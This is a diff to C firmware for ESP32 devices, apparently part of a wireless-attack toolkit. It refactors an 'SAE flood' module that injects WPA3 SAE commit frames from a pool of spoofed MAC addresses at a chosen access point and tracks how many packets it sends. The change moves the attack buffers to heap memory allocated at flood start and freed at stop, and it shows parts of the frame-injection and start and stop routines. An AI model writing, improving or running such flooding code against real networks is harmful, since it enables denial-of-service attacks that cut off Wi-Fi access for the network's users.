@@ -19,6 +19,7 @@
 #include "esp_wifi.h"
 #include "esp_random.h"
 #include "esp_log.h"
+#include <esp_heap_caps.h>
 #include "freertos/task.h"
 #include "freertos/portmacro.h"
 #include "freertos/semphr.h"
@@ -45,6 +46,9 @@ extern void wifi_manager_stop_monitor_mode(void);
 // SAE MAC pool configuration
 #define SAE_MAC_POOL_SIZE 8
 #define SAE_PRECOMPUTE_LIMIT 8
+#define SAE_FRAME_BUFFER_SIZE 512
+#define SAE_PASSWORD_BUF_LEN 64
+#define SAE_INJ_ELEMENT_BUF_LEN 33
 
 // Module state
 static TaskHandle_t sae_flood_task_handle = NULL;
@@ -55,14 +59,14 @@ static uint8_t sae_target_bssid[6];
 static int sae_target_channel = 1;
 static int sae_injection_rate = 25;
 
-// MAC pool for spoofed addresses
-static uint8_t sae_mac_pool[SAE_MAC_POOL_SIZE][6];
+// MAC pool for spoofed addresses (heap-on-demand: see sae_heap_alloc)
+static uint8_t (*sae_mac_pool)[6] = NULL;
 static bool sae_mac_pool_ready = false;
 static int sae_frames_per_mac = 32;
 
-// Cached commit data per MAC
-static uint8_t sae_commit_element_cache[SAE_MAC_POOL_SIZE][33];
-static uint8_t sae_commit_scalar_cache[SAE_MAC_POOL_SIZE][32];
+// Cached commit data per MAC (heap-on-demand: see sae_heap_alloc)
+static uint8_t (*sae_commit_element_cache)[33] = NULL;
+static uint8_t (*sae_commit_scalar_cache)[32] = NULL;
 static bool sae_commit_cache_ready[SAE_MAC_POOL_SIZE];
 static bool sae_precompute_attempted[SAE_MAC_POOL_SIZE];
 static uint16_t sae_seq_counters[SAE_MAC_POOL_SIZE];
@@ -77,13 +81,13 @@ static uint32_t sae_commit_tx_err = 0;
 static uint32_t sae_status76_rx = 0;
 static uint32_t sae_status0_rx = 0;
 
-// Token tracking
-static uint8_t sae_token_mac[6];
+// Token tracking (heap-on-demand: see sae_heap_alloc)
+static uint8_t *sae_token_mac = NULL;
 static bool sae_token_mac_valid = false;
 
 static volatile bool sae_pending_peer = false;
-static uint8_t sae_pending_scalar[32];
-static uint8_t sae_pending_element[33];
+static uint8_t *sae_pending_scalar = NULL;
+static uint8_t *sae_pending_element = NULL;
 
 // SAE protocol state
 typedef struct {
@@ -113,14 +117,66 @@ static bool sae_initialized = false;
 static portMUX_TYPE sae_lock = portMUX_INITIALIZER_UNLOCKED;
 static SemaphoreHandle_t sae_crypto_mutex = NULL;
 
-// Static buffers to reduce stack usage
-static uint8_t sae_pwd_seed[128];
-static uint8_t sae_pwd_value[32];
+// Static buffers to reduce stack usage (heap-on-demand: see sae_heap_alloc)
+static uint8_t *sae_pwd_seed = NULL;
+static uint8_t *sae_pwd_value = NULL;
 
 // Static mbedTLS contexts
 static mbedtls_sha256_context sae_sha256;
 static mbedtls_ecp_point sae_tmp_point;
 static bool sae_crypto_initialized = false;
+
+/* Heap-on-demand attack buffers (~1.6KB internal when idle). PSRAM first,
+ * internal fallback. Allocated in sae_flood_start before running=true is set
+ * and freed in sae_flood_stop after tasks join and monitor mode stops, so no
+ * use site needs a NULL check while the attack runs. */
+static void *sae_heap_calloc(size_t n, size_t size) {
+    void *p = heap_caps_calloc(n, size, MALLOC_CAP_SPIRAM | MALLOC_CAP_8BIT);
+    if (!p) {
+        p = heap_caps_calloc(n, size, MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
+    }
+    return p;
+}
+
+static void sae_heap_free(void) {
+    heap_caps_free(sae_mac_pool); sae_mac_pool = NULL;
+    heap_caps_free(sae_commit_element_cache); sae_commit_element_cache = NULL;
+    heap_caps_free(sae_commit_scalar_cache); sae_commit_scalar_cache = NULL;
+    heap_caps_free(sae_pwd_seed); sae_pwd_seed = NULL;
+    heap_caps_free(sae_pwd_value); sae_pwd_value = NULL;
+    heap_caps_free(sae_frame_buffer); sae_frame_buffer = NULL;
+    heap_caps_free(sae_flood_password_buf); sae_flood_password_buf = NULL;
+    heap_caps_free(sae_pending_scalar); sae_pending_scalar = NULL;
+    heap_caps_free(sae_pending_element); sae_pending_element = NULL;
+    heap_caps_free(sae_token_mac); sae_token_mac = NULL;
+    heap_caps_free(sae_inj_element_x); sae_inj_element_x = NULL;
+    heap_caps_free(sae_inj_element_buf); sae_inj_element_buf = NULL;
+}
+
+static bool sae_heap_alloc(void) {
+    sae_mac_pool = sae_heap_calloc(SAE_MAC_POOL_SIZE, 6);
+    sae_commit_element_cache = sae_heap_calloc(SAE_MAC_POOL_SIZE, 33);
+    sae_commit_scalar_cache = sae_heap_calloc(SAE_MAC_POOL_SIZE, 32);
+    sae_pwd_seed = sae_heap_calloc(128, 1);
+    sae_pwd_value = sae_heap_calloc(32, 1);
+    sae_frame_buffer = sae_heap_calloc(SAE_FRAME_BUFFER_SIZE, 1);
+    sae_flood_password_buf = sae_heap_calloc(SAE_PASSWORD_BUF_LEN, 1);
+    sae_pending_scalar = sae_heap_calloc(32, 1);
+    sae_pending_element = sae_heap_calloc(33, 1);
+    sae_token_mac = sae_heap_calloc(6, 1);
+    sae_inj_element_x = sae_heap_calloc(32, 1);
+    sae_inj_element_buf = sae_heap_calloc(SAE_INJ_ELEMENT_BUF_LEN, 1);
+    if (!sae_mac_pool || !sae_commit_element_cache || !sae_commit_scalar_cache ||
+        !sae_pwd_seed || !sae_pwd_value || !sae_frame_buffer || !sae_flood_password_buf ||
+        !sae_pending_scalar || !sae_pending_element || !sae_token_mac ||
+        !sae_inj_element_x || !sae_inj_element_buf) {
+        sae_heap_free();
+        return false;
+    }
+    return true;
+}
+
+
 
 static int sae_random_func(void *ctx, unsigned char *buf, size_t len) {
     (void)ctx;
@@ -128,9 +184,9 @@ static int sae_random_func(void *ctx, unsigned char *buf, size_t len) {
     return 0;
 }
 
-// Static frame buffer
-static uint8_t sae_frame_buffer[512];
-static char sae_flood_password_buf[64];
+// Static frame buffer (heap-on-demand: see sae_heap_alloc)
+static uint8_t *sae_frame_buffer = NULL;
+static char *sae_flood_password_buf = NULL;
 
 // Forward declarations
 static esp_err_t sae_init_context(const char *password, const uint8_t *own_mac, const uint8_t *peer_mac, const char *ssid);
@@ -311,8 +367,8 @@ static void sanitize_password_input(const char *in, char *out, size_t out_size) 
 }
 
 static uint8_t sae_inj_token_buf[128];
-static uint8_t sae_inj_element_x[32];
-static uint8_t sae_inj_element_buf[33];
+static uint8_t *sae_inj_element_x = NULL;
+static uint8_t *sae_inj_element_buf = NULL;
 
 static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     int frame_len = 0;
@@ -382,7 +438,7 @@ static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
         memcpy(sae_ctx.bssid, sae_target_bssid, 6);
         mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[pool_idx], 32);
         portEXIT_CRITICAL(&sae_lock);
-        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
+        if ((size_t)frame_len + 32 + 32 > SAE_FRAME_BUFFER_SIZE) {
             return ESP_ERR_NO_MEM;
         }
         memcpy(sae_frame_buffer + frame_len, sae_commit_scalar_cache[pool_idx], 32);
@@ -416,11 +472,11 @@ static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
         size_t elen = 0;
         if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
                                            MBEDTLS_ECP_PF_COMPRESSED, &elen,
-                                           sae_inj_element_buf, sizeof(sae_inj_element_buf)) != 0 || elen < 33) {
+                                           sae_inj_element_buf, SAE_INJ_ELEMENT_BUF_LEN) != 0 || elen < 33) {
             return ESP_FAIL;
         }
         memcpy(sae_inj_element_x, sae_inj_element_buf + 1, 32);
-        if ((size_t)frame_len + 32 + 32 > sizeof(sae_frame_buffer)) {
+        if ((size_t)frame_len + 32 + 32 > SAE_FRAME_BUFFER_SIZE) {
             return ESP_ERR_NO_MEM;
         }
         mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_frame_buffer + frame_len, 32);
@@ -431,7 +487,7 @@ static esp_err_t inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
     ESP_LOGI("SAE_TX", "frm len=%d", frame_len);
 
     if (token_required_local && token_len_local > 0) {
-        size_t remaining = sizeof(sae_frame_buffer) - frame_len;
+        size_t remaining = SAE_FRAME_BUFFER_SIZE - frame_len;
         if ((size_t)token_len_local > remaining) token_len_local = (uint16_t)remaining;
         if (token_len_local > 0) {
             memcpy(sae_frame_buffer + frame_len, sae_inj_token_buf, token_len_local);
@@ -685,13 +741,18 @@ void sae_flood_start(const char *password) {
         return;
     }
 
+    if (!sae_heap_alloc()) {
+        glog("SAE flood: out of memory for attack buffers\n");
+        return;
+    }
+
     memcpy(sae_target_bssid, selected_ap.bssid, 6);
     sae_target_channel = selected_ap.primary;
     sae_injection_rate = 60;
     sae_flood_packets_sent = 0;
     sae_flood_running = true;
     sae_initialized = false;
-    sanitize_password_input(password, sae_flood_password_buf, sizeof(sae_flood_password_buf));
+    sanitize_password_input(password, sae_flood_password_buf, SAE_PASSWORD_BUF_LEN);
     portENTER_CRITICAL(&sae_lock);
     sae_ctx.token_required = false;
     sae_ctx.token_len = 0;
@@ -838,6 +899,7 @@ void sae_flood_stop(void) {
     }
     memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
     sae_mac_pool_ready = false;
+    sae_heap_free();
     glog("SAE-Flood stopped. Total: %d packets\n", sae_flood_packets_sent);
 #ifdef CONFIG_WITH_STATUS_DISPLAY
     status_display_show_status("SAE stopped");
